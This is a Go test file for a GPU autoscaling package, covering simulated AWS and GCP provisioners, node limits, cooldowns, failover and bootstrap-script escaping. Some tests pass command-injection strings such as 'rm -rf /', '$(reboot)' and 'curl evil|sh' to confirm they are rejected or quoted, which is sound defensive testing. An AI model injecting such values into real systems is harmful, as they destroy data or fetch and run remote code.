package autoscale

import (
	"context"
	"errors"
	"fmt"
	"math"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
)

func TestAWSProvisionGPU(t *testing.T) {
	p := NewAWSProvisioner()
	node, err := p.ProvisionGPU(context.Background(), NodeSpec{InstanceType: "A100", GPUCount: 1, Region: "us-east-1"})
	if err != nil {
		t.Fatalf("provision failed: %v", err)
	}
	if node == nil || node.Provider != "aws" {
		t.Fatalf("unexpected node: %v", node)
	}
	if !node.Simulated || node.PublicIP != "" {
		t.Fatalf("simulated node must be flagged and have no public IP: %+v", node)
	}
}

func TestGCPProvisionGPU(t *testing.T) {
	p := NewGCPProvisioner()
	node, err := p.ProvisionGPU(context.Background(), NodeSpec{InstanceType: "A100", GPUCount: 1, Region: "us-east-1"})
	if err != nil {
		t.Fatalf("provision failed: %v", err)
	}
	if node == nil || node.Provider != "gcp" || !node.Simulated {
		t.Fatalf("unexpected node: %v", node)
	}
}

func TestSimulatorTracksNodes(t *testing.T) {
	p := NewAWSProvisioner()
	ctx := context.Background()
	ids := map[string]bool{}
	for i := 0; i < 3; i++ {
		n, err := p.ProvisionGPU(ctx, NodeSpec{InstanceType: "A100"})
		if err != nil {
			t.Fatal(err)
		}
		if ids[n.ID] {
			t.Fatalf("duplicate node id %s", n.ID)
		}
		ids[n.ID] = true
	}
	nodes, err := p.List(ctx)
	if err != nil || len(nodes) != 3 {
		t.Fatalf("expected 3 listed nodes, got %d (%v)", len(nodes), err)
	}
	if err := p.Terminate(ctx, nodes[0].ID); err != nil {
		t.Fatalf("terminate failed: %v", err)
	}
	if err := p.Terminate(ctx, nodes[0].ID); !errors.Is(err, ErrNodeNotFound) {
		t.Fatalf("expected ErrNodeNotFound for double terminate, got %v", err)
	}
	if nodes, _ = p.List(ctx); len(nodes) != 2 {
		t.Fatalf("expected 2 nodes after terminate, got %d", len(nodes))
	}
}

func TestSimulatorMaxNodes(t *testing.T) {
	p := NewGCPProvisioner()
	if err := p.SetMaxNodes(2); err != nil {
		t.Fatal(err)
	}
	if err := p.SetMaxNodes(0); err == nil {
		t.Fatal("expected error for max nodes 0")
	}
	ctx := context.Background()
	for i := 0; i < 2; i++ {
		if _, err := p.ProvisionGPU(ctx, NodeSpec{InstanceType: "A100"}); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := p.ProvisionGPU(ctx, NodeSpec{InstanceType: "A100"}); !errors.Is(err, ErrMaxNodes) {
		t.Fatalf("expected ErrMaxNodes, got %v", err)
	}
}

func TestSimulatorValidatesSpecAndContext(t *testing.T) {
	p := NewAWSProvisioner()
	bad := []NodeSpec{
		{InstanceType: ""},
		{InstanceType: "A100", GPUCount: -1},
		{InstanceType: "A100", GPUCount: MaxGPUCount + 1},
		{InstanceType: "A100; rm -rf /"},
		{InstanceType: "A100", Region: "us east"},
		{InstanceType: "A100", SSHKey: "ssh-rsa AAA\ncurl evil"},
	}
	for _, s := range bad {
		if _, err := p.ProvisionGPU(context.Background(), s); !errors.Is(err, ErrInvalidSpec) {
			t.Fatalf("expected ErrInvalidSpec for %+v, got %v", s, err)
		}
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := p.ProvisionGPU(ctx, NodeSpec{InstanceType: "A100"}); !errors.Is(err, context.Canceled) {
		t.Fatalf("expected context error, got %v", err)
	}
	// nil context tolerated.
	//nolint:staticcheck // explicitly testing nil context tolerance
	if _, err := p.ProvisionGPU(nil, NodeSpec{InstanceType: "A100"}); err != nil {
		t.Fatalf("nil ctx should be tolerated: %v", err)
	}
}

func TestBootstrapScriptContainsNodeID(t *testing.T) {
	script := BootstrapScript([]string{"peer1"}, "node-1")
	if !strings.Contains(script, "AEROLLM_MESH_NODE_ID=node-1") {
		t.Fatalf("missing node id in script")
	}
	if !strings.Contains(script, "AEROLLM_MESH_PEERS=peer1") {
		t.Fatalf("missing peers in script")
	}
}

func TestBootstrapScriptEscapesInjection(t *testing.T) {
	script := BootstrapScript([]string{"p1", "p2; curl evil|sh"}, "x$(reboot)\nrm -rf /'")
	if strings.Contains(script, "\nrm -rf") {
		t.Fatalf("newline injection not stripped:\n%s", script)
	}
	if !strings.Contains(script, `AEROLLM_MESH_NODE_ID='x$(reboot)rm -rf /'\'''`) {
		t.Fatalf("node id not single-quoted:\n%s", script)
	}
	if !strings.Contains(script, `AEROLLM_MESH_PEERS='p1,p2; curl evil|sh'`) {
		t.Fatalf("peers not single-quoted:\n%s", script)
	}
	if strings.Contains(BootstrapScript(nil, ""), "AEROLLM_MESH_NODE_ID=\n") {
		t.Fatal("empty value must be emitted as ''")
	}
}

func TestBootstrapScriptE(t *testing.T) {
	if _, err := BootstrapScriptE([]string{"10.0.0.1:7946"}, "node-1"); err != nil {
		t.Fatalf("valid input rejected: %v", err)
	}
	if _, err := BootstrapScriptE(nil, "bad id"); !errors.Is(err, ErrInvalidSpec) {
		t.Fatalf("expected ErrInvalidSpec, got %v", err)
	}
	if _, err := BootstrapScriptE([]string{"a;b"}, "n1"); !errors.Is(err, ErrInvalidSpec) {
		t.Fatalf("expected ErrInvalidSpec for peer, got %v", err)
	}
}

func TestMetaAgentInfraLoopTriggers(t *testing.T) {
	called := false
	p := &stubProvisioner{
		onProvision: func(ctx context.Context, spec NodeSpec) (*Node, error) {
			called = true
			return &Node{ID: "n1", Provider: spec.Provider, InstanceType: spec.InstanceType}, nil
		},
	}
	loop := NewMetaAgentInfraLoop(p, 0.1)
	_, err := loop.Evaluate(context.Background(), 0.3)
	if err != nil {
		t.Fatalf("evaluate failed: %v", err)
	}
	if !called {
		t.Fatalf("expected provisioner to be called")
	}
}

func TestMetaAgentInfraLoopNoTrigger(t *testing.T) {
	called := false
	p := &stubProvisioner{
		onProvision: func(ctx context.Context, spec NodeSpec) (*Node, error) {
			called = true
			return &Node{}, nil
		},
	}
	loop := NewMetaAgentInfraLoop(p, 0.2)
	node, err := loop.Evaluate(context.Background(), 0.1)
	if err != nil || node != nil {
		t.Fatalf("expected (nil, nil) below threshold, got %v, %v", node, err)
	}
	if called {
		t.Fatalf("expected no provisioning below threshold")
	}
}

func TestEvaluateRejectsInvalidDeficit(t *testing.T) {
	loop := NewServerMetaAgentLoop()
	for _, d := range []float64{math.NaN(), math.Inf(1), math.Inf(-1), -0.1, MaxDeficit + 1, 1e308} {
		if _, err := loop.Evaluate(context.Background(), d); !errors.Is(err, ErrInvalidDeficit) {
			t.Fatalf("deficit %v: expected ErrInvalidDeficit, got %v", d, err)
		}
	}
}

func TestEvaluateCooldown(t *testing.T) {
	loop := NewServerMetaAgentLoop()
	now := time.Unix(1_000_000, 0)
	loop.now = func() time.Time { return now }
	ctx := context.Background()
	n, err := loop.Evaluate(ctx, 0.5)
	if err != nil || n == nil || !n.Simulated {
		t.Fatalf("first provision failed: %v %v", n, err)
	}
	if _, err := loop.Evaluate(ctx, 0.5); !errors.Is(err, ErrCooldown) {
		t.Fatalf("expected ErrCooldown, got %v", err)
	}
	now = now.Add(DefaultProvisionCooldown)
	if _, err := loop.Evaluate(ctx, 0.5); err != nil {
		t.Fatalf("expected provision after cooldown, got %v", err)
	}
	if err := loop.SetCooldown(-time.Second); err == nil {
		t.Fatal("expected error for negative cooldown")
	}
}

func TestEvaluateFailureDoesNotConsumeCooldown(t *testing.T) {
	var fail atomic.Bool
	fail.Store(true)
	p := &stubProvisioner{onProvision: func(ctx context.Context, spec NodeSpec) (*Node, error) {
		if fail.Load() {
			return nil, fmt.Errorf("down")
		}
		return &Node{ID: "ok"}, nil
	}}
	loop := NewMetaAgentInfraLoop(p, 0.1)
	if _, err := loop.Evaluate(context.Background(), 0.5); err == nil {
		t.Fatal("expected failure")
	}
	fail.Store(false)
	if n, err := loop.Evaluate(context.Background(), 0.5); err != nil || n == nil {
		t.Fatalf("retry after failure should not hit cooldown: %v", err)
	}
}

func TestEvaluateMaxNodes(t *testing.T) {
	loop := NewServerMetaAgentLoop()
	if err := loop.SetCooldown(0); err != nil {
		t.Fatal(err)
	}
	if err := loop.SetMaxNodes(2); err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	for i := 0; i < 2; i++ {
		if _, err := loop.Evaluate(ctx, 0.5); err != nil {
			t.Fatalf("provision %d failed: %v", i, err)
		}
	}
	if _, err := loop.Evaluate(ctx, 0.5); !errors.Is(err, ErrMaxNodes) {
		t.Fatalf("expected ErrMaxNodes, got %v", err)
	}
}

func TestEvaluateListErrorFailsClosed(t *testing.T) {
	p := &stubProvisioner{listErr: fmt.Errorf("api down")}
	loop := NewMetaAgentInfraLoop(p, 0.1)
	if _, err := loop.Evaluate(context.Background(), 0.5); err == nil {
		t.Fatal("expected error when node listing fails")
	}
	if p.provisionCalls.Load() != 0 {
		t.Fatal("must not provision when node count is unknown")
	}
}

func TestEvaluateConcurrent(t *testing.T) {
	loop := NewServerMetaAgentLoop()
	var wg sync.WaitGroup
	var ok, cooldown atomic.Int64
	for i := 0; i < 32; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			n, err := loop.Evaluate(context.Background(), 0.9)
			switch {
			case err == nil && n != nil:
				ok.Add(1)
			case errors.Is(err, ErrCooldown):
				cooldown.Add(1)
			default:
				t.Errorf("unexpected result: %v %v", n, err)
			}
		}()
	}
	wg.Wait()
	if ok.Load() != 1 || cooldown.Load() != 31 {
		t.Fatalf("expected exactly one provision, got ok=%d cooldown=%d", ok.Load(), cooldown.Load())
	}
}

func TestServerMetaAgentLoopFallback(t *testing.T) {
	primary := &stubProvisioner{onProvision: func(ctx context.Context, spec NodeSpec) (*Node, error) {
		return nil, fmt.Errorf("aws down")
	}}
	fallback := &stubProvisioner{onProvision: func(ctx context.Context, spec NodeSpec) (*Node, error) {
		return &Node{ID: "gcp-1", Provider: "gcp", InstanceType: spec.InstanceType}, nil
	}}
	loop := NewServerMetaAgentLoopWith(primary, fallback, 0.1)
	node, err := loop.Evaluate(context.Background(), 0.3)
	if err != nil {
		t.Fatalf("evaluate failed: %v", err)
	}
	if node == nil || node.Provider != "gcp" {
		t.Fatalf("expected fallback provider, got %v", node)
	}
}

func TestServerMetaAgentLoopTerminateUsesFallback(t *testing.T) {
	primary := &stubProvisioner{onProvision: func(ctx context.Context, spec NodeSpec) (*Node, error) {
		return nil, fmt.Errorf("aws down")
	}}
	fallback := &stubProvisioner{onProvision: func(ctx context.Context, spec NodeSpec) (*Node, error) {
		return &Node{ID: "gcp-1", Provider: "gcp"}, nil
	}}
	loop := NewServerMetaAgentLoopWith(primary, fallback, 0.1)
	node, err := loop.Evaluate(context.Background(), 0.3)
	if err != nil || node == nil {
		t.Fatalf("evaluate failed: %v", err)
	}
	fp := loop.provisioner.(*failoverProvisioner)
	if err := fp.Terminate(context.Background(), node.ID); err != nil {
		t.Fatalf("terminate failed: %v", err)
	}
	if !fallback.terminateCalled.Load() {
		t.Fatalf("expected fallback terminate")
	}
	if primary.terminateCalled.Load() {
		t.Fatalf("primary must not be asked to terminate a fallback node")
	}
}

func TestFailoverRoutesTerminateByOwner(t *testing.T) {
	var primaryFail atomic.Bool
	primary := &stubProvisioner{onProvision: func(ctx context.Context, spec NodeSpec) (*Node, error) {
		if primaryFail.Load() {
			return nil, fmt.Errorf("aws down")
		}
		return &Node{ID: "aws-1", Provider: "aws"}, nil
	}}
	fallback := &stubProvisioner{onProvision: func(ctx context.Context, spec NodeSpec) (*Node, error) {
		return &Node{ID: "gcp-1", Provider: "gcp"}, nil
	}}
	fp := &failoverProvisioner{primary: primary, fallback: fallback}
	ctx := context.Background()
	if _, err := fp.ProvisionGPU(ctx, NodeSpec{InstanceType: "A100"}); err != nil {
		t.Fatal(err)
	}
	primaryFail.Store(true)
	if _, err := fp.ProvisionGPU(ctx, NodeSpec{InstanceType: "A100"}); err != nil {
		t.Fatal(err)
	}
	// After a fallback event, primary-owned nodes must still go to primary.
	if err := fp.Terminate(ctx, "aws-1"); err != nil {
		t.Fatal(err)
	}
	if !primary.terminateCalled.Load() || fallback.terminateCalled.Load() {
		t.Fatalf("terminate routed to wrong provider")
	}
	if err := fp.Terminate(ctx, "unknown"); !errors.Is(err, ErrNodeNotFound) {
		t.Fatalf("expected ErrNodeNotFound, got %v", err)
	}
}

func TestFailoverListMergesAndBothFail(t *testing.T) {
	primary, fallback := NewAWSProvisioner(), NewGCPProvisioner()
	fp := &failoverProvisioner{primary: primary, fallback: fallback}
	ctx := context.Background()
	if _, err := primary.ProvisionGPU(ctx, NodeSpec{InstanceType: "A100"}); err != nil {
		t.Fatal(err)
	}
	if _, err := fallback.ProvisionGPU(ctx, NodeSpec{InstanceType: "A100"}); err != nil {
		t.Fatal(err)
	}
	nodes, err := fp.List(ctx)
	if err != nil || len(nodes) != 2 {
		t.Fatalf("expected merged list of 2, got %d (%v)", len(nodes), err)
	}

	bad := &failoverProvisioner{
		primary:  &stubProvisioner{onProvision: func(context.Context, NodeSpec) (*Node, error) { return nil, fmt.Errorf("p") }},
		fallback: &stubProvisioner{onProvision: func(context.Context, NodeSpec) (*Node, error) { return nil, fmt.Errorf("f") }},
	}
	if _, err := bad.ProvisionGPU(ctx, NodeSpec{InstanceType: "A100"}); err == nil ||
		!strings.Contains(err.Error(), "p") || !strings.Contains(err.Error(), "f") {
		t.Fatalf("expected joined error, got %v", err)
	}
}

type stubProvisioner struct {
	onProvision     func(ctx context.Context, spec NodeSpec) (*Node, error)
	listErr         error
	provisionCalls  atomic.Int64
	terminateCalled atomic.Bool
}

func (s *stubProvisioner) ProvisionGPU(ctx context.Context, spec NodeSpec) (*Node, error) {
	s.provisionCalls.Add(1)
	if s.onProvision != nil {
		return s.onProvision(ctx, spec)
	}
	return &Node{}, nil
}

func (s *stubProvisioner) Terminate(ctx context.Context, nodeID string) error {
	s.terminateCalled.Store(true)
	return nil
}

func (s *stubProvisioner) List(ctx context.Context) ([]Node, error) { return nil, s.listErr }
